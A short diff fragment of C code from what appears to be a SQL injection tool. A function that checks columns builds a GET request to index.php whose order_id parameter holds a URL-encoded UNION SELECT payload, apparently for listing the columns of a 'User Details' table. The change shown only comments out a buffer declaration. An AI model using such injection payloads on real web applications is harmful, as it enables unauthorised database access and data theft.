@@ -253,7 +253,7 @@ bool check_table(const void *ctx) {
 // SQL: ... WHERE table_name = 'User Details' ...
 bool check_column(const void *ctx) {
     ColumnCtx *c_ctx = (ColumnCtx*)ctx;
-    char mal_req[4096];
+    //char mal_req[4096];
 
     const char *fmt =
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20column_name%%20"
